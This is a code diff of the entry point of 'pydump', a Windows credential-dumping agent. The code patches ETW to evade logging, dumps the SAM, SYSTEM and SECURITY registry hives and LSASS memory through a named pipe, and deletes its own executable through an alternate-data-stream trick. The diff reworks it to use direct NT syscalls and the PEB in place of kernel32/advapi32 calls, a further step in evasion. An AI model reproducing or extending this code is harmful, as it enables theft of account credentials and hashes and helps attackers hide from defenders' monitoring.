@@ -1,16 +1,6 @@
 /**
- * pydump agent — entry point.
- *
- * Usage: agent.exe <MODE> <PID> <PIPE_NAME>
- *   MODE: bitmask — 1=registry, 2=LSASS, 3=both
- *   PID:  LSASS process ID (ignored if mode doesn't include LSASS)
- *
- * Protocol (on the named pipe):
- *   "PYD\x01"                          magic (4 bytes)
- *   <u32 size><data>                   SYSTEM hive  (0 if skipped)
- *   <u32 size><data>                   SAM hive     (0 if skipped)
- *   <u32 size><data>                   SECURITY hive(0 if skipped)
- *   <remaining bytes until close>      LSASS MDMP   (if mode & 2)
+ * pydump agent — entry point. Zero kernel32/advapi32 dependencies.
+ * Command line and image path from PEB, exit via NtTerminateProcess.
  */
 
 #include <windows.h>
@@ -18,7 +8,8 @@
 #include "../include/agent.h"
 #include "../include/registry.h"
 
-// Simple wide-string to int
+/* ── Helpers ─────────────────────────────────────────────── */
+
 static DWORD wtoi(const wchar_t *s) {
     DWORD val = 0;
     while (*s >= L'0' && *s <= L'9') {
@@ -28,56 +19,104 @@ static DWORD wtoi(const wchar_t *s) {
     return val;
 }
 
-// Self-delete: rename running EXE to ADS, then mark for deletion.
-// The file disappears from disk while the process is still running.
+/* ── Self-delete via NtSetInformationFile ────────────────── */
+
 static void self_delete(void) {
-    wchar_t path[MAX_PATH];
-    if (!GetModuleFileNameW(NULL, path, MAX_PATH)) return;
+    PUNICODE_STRING img_path = get_image_path();
+    if (!img_path || !img_path->Buffer || !img_path->Length) return;
 
-    // Step 1: Open our own file with DELETE access
-    HANDLE hFile = CreateFileW(path, DELETE | SYNCHRONIZE,
-        FILE_SHARE_READ | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) return;
+    /* Build NT path: \??\<image_path> */
+    /* PEB ImagePathName is typically a DOS path like C:\..., need \??\ prefix */
+    wchar_t nt_path[520];
+    nt_path[0] = L'\\';
+    nt_path[1] = L'?';
+    nt_path[2] = L'?';
+    nt_path[3] = L'\\';
+    int off = 4;
 
-    // Step 2: Rename to an alternate data stream (makes the base file "empty")
-    // FILE_RENAME_INFO: ReplaceIfExists(4) + RootDirectory(8) + FileNameLength(4) + FileName[]
-    BYTE rename_buf[64] = {0};
-    *(DWORD *)&rename_buf[0] = 0;        // ReplaceIfExists = FALSE
-    *(DWORD *)&rename_buf[8] = 0;        // RootDirectory = NULL (high dword)
-    *(DWORD *)&rename_buf[12] = 4;       // FileNameLength = 4 bytes (":x")
-    rename_buf[16] = ':'; rename_buf[17] = 0;  // L':'
-    rename_buf[18] = 'x'; rename_buf[19] = 0;  // L'x'
-
-    // SetFileInformationByHandle with FileRenameInfo (class 3)
-    typedef BOOL (WINAPI *SetFileInfo_t)(HANDLE, int, LPVOID, DWORD);
-    HMODULE k32 = GetModuleHandleW(L"kernel32.dll");
-    SetFileInfo_t pSetFileInfo = (SetFileInfo_t)GetProcAddress(k32, "SetFileInformationByHandle");
-    if (!pSetFileInfo) { CloseHandle(hFile); return; }
-
-    if (!pSetFileInfo(hFile, 3 /*FileRenameInfo*/, rename_buf, sizeof(rename_buf))) {
-        CloseHandle(hFile);
-        return;
+    wchar_t *src = img_path->Buffer;
+    USHORT src_chars = img_path->Length / sizeof(wchar_t);
+    for (USHORT i = 0; i < src_chars && off < 518; i++) {
+        nt_path[off++] = src[i];
     }
-    CloseHandle(hFile);
+    nt_path[off] = L'\0';
 
-    // Step 3: Open the now-empty base file and mark for deletion
-    hFile = CreateFileW(path, DELETE | SYNCHRONIZE,
-        FILE_SHARE_READ | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) return;
+    UNICODE_STRING us;
+    us.Length = (USHORT)(off * sizeof(wchar_t));
+    us.MaximumLength = (USHORT)((off + 1) * sizeof(wchar_t));
+    us.Buffer = nt_path;
 
-    // FILE_DISPOSITION_INFO: DeleteFile = TRUE
-    BYTE disp_buf[4] = {1, 0, 0, 0};
-    pSetFileInfo(hFile, 4 /*FileDispositionInfo*/, disp_buf, sizeof(disp_buf));
-    CloseHandle(hFile);
+    OBJECT_ATTRIBUTES oa;
+    InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+    IO_STATUS_BLOCK iosb;
+    HANDLE hFile = NULL;
+
+    /* Step 1: Open own file with DELETE|SYNCHRONIZE */
+    NTSTATUS status = sys_NtCreateFile(
+        &hFile,
+        0x00010000 | 0x00100000, /* DELETE | SYNCHRONIZE */
+        &oa, &iosb, NULL, 0,
+        FILE_SHARE_READ | FILE_SHARE_DELETE,
+        FILE_OPEN,
+        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
+        NULL, 0
+    );
+    if (!NT_SUCCESS(status)) return;
+
+    /* Step 2: Rename to ":x" ADS (FileRenameInformation = 10) */
+    struct {
+        BOOLEAN ReplaceIfExists;
+        BYTE    pad[7];
+        HANDLE  RootDirectory;
+        ULONG   FileNameLength;
+        WCHAR   FileName[2];
+    } rename_info;
+    rename_info.ReplaceIfExists = 0;
+    rename_info.pad[0] = 0; rename_info.pad[1] = 0; rename_info.pad[2] = 0;
+    rename_info.pad[3] = 0; rename_info.pad[4] = 0; rename_info.pad[5] = 0;
+    rename_info.pad[6] = 0;
+    rename_info.RootDirectory = NULL;
+    rename_info.FileNameLength = 4; /* 2 wchars = 4 bytes */
+    rename_info.FileName[0] = L':';
+    rename_info.FileName[1] = L'x';
+
+    status = sys_NtSetInformationFile(hFile, &iosb, &rename_info,
+                                       sizeof(rename_info), FileRenameInformation);
+    sys_NtClose(hFile);
+    if (!NT_SUCCESS(status)) return;
+
+    /* Step 3: Open again and mark for deletion (FileDispositionInformation = 13) */
+    status = sys_NtCreateFile(
+        &hFile,
+        0x00010000 | 0x00100000, /* DELETE | SYNCHRONIZE */
+        &oa, &iosb, NULL, 0,
+        FILE_SHARE_READ | FILE_SHARE_DELETE,
+        FILE_OPEN,
+        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
+        NULL, 0
+    );
+    if (!NT_SUCCESS(status)) return;
+
+    FILE_DISPOSITION_INFORMATION disp;
+    disp.DeleteFile = TRUE;
+    sys_NtSetInformationFile(hFile, &iosb, &disp, sizeof(disp), FileDispositionInformation);
+    sys_NtClose(hFile);
 }
 
-// Entry point — no CRT dependency for smaller binary
-void main_entry(void) {
-    // Parse command line: "agent.exe <MODE> <PID> <PIPE_NAME>"
-    wchar_t *cmdline = GetCommandLineW();
+/* ── Entry point ─────────────────────────────────────────── */
 
-    // Skip executable name
-    wchar_t *p = cmdline;
+void main_entry(void) {
+    /* Parse command line from PEB: "agent.exe <MODE> <PID> <PIPE_NAME>" */
+    PUNICODE_STRING cmdline_us = get_command_line();
+    if (!cmdline_us || !cmdline_us->Buffer) {
+        sys_NtTerminateProcess((HANDLE)-1, 1);
+        return;
+    }
+
+    wchar_t *p = cmdline_us->Buffer;
+
+    /* Skip executable name */
     if (*p == L'"') {
         p++;
         while (*p && *p != L'"') p++;
@@ -87,65 +126,67 @@ void main_entry(void) {
     }
     while (*p == L' ') p++;
 
-    // Parse MODE (1=registry, 2=lsass, 3=both)
+    /* Parse MODE */
     DWORD mode = wtoi(p);
     while (*p && *p != L' ') p++;
     while (*p == L' ') p++;
 
-    // Parse PID
+    /* Parse PID */
     DWORD pid = wtoi(p);
     while (*p && *p != L' ') p++;
     while (*p == L' ') p++;
 
-    // Remaining is pipe name
+    /* Remaining is pipe name */
     wchar_t *pipe_name = p;
     wchar_t *end = pipe_name;
     while (*end && *end != L' ' && *end != L'\r' && *end != L'\n') end++;
     *end = L'\0';
 
     if (mode == 0 || pipe_name[0] == L'\0') {
-        ExitProcess(1);
+        sys_NtTerminateProcess((HANDLE)-1, 1);
+        return;
     }
 
-    // Step 1: Resolve syscalls
+    /* Step 1: Resolve syscalls */
     if (!resolve_syscalls()) {
-        ExitProcess(2);
+        sys_NtTerminateProcess((HANDLE)-1, 2);
+        return;
     }
 
-    // Step 2: Patch ETW
+    /* Step 2: Patch ETW */
     patch_etw();
 
-    // Step 3: Create named pipe
+    /* Step 3: Create named pipe */
     HANDLE pipe = open_named_pipe(pipe_name);
     if (!pipe) {
-        ExitProcess(3);
+        sys_NtTerminateProcess((HANDLE)-1, 3);
+        return;
     }
 
-    // Step 4: Protocol header
+    /* Step 4: Protocol header */
     BYTE magic[4] = {'P', 'Y', 'D', 0x01};
     write_pipe(pipe, magic, 4);
 
-    // Step 5: Registry hives (if mode & 1)
+    /* Step 5: Registry hives (if mode & 1) */
     if (mode & 1) {
         init_registry();
         dump_registry_hives(pipe);
     } else {
-        // Send 3 empty hive slots
         DWORD zero = 0;
         write_pipe(pipe, &zero, 4);
         write_pipe(pipe, &zero, 4);
         write_pipe(pipe, &zero, 4);
     }
 
-    // Step 6: LSASS dump (if mode & 2)
+    /* Step 6: LSASS dump (if mode & 2) */
     BOOL success = TRUE;
     if ((mode & 2) && pid > 0) {
         success = dump_lsass(pid, pipe);
     }
 
-    // Step 7: Cleanup
+    /* Step 7: Cleanup */
     close_pipe(pipe);
     self_delete();
 
-    ExitProcess(success ? 0 : 4);
+    sys_NtTerminateProcess((HANDLE)-1, success ? 0 : 4);
 }
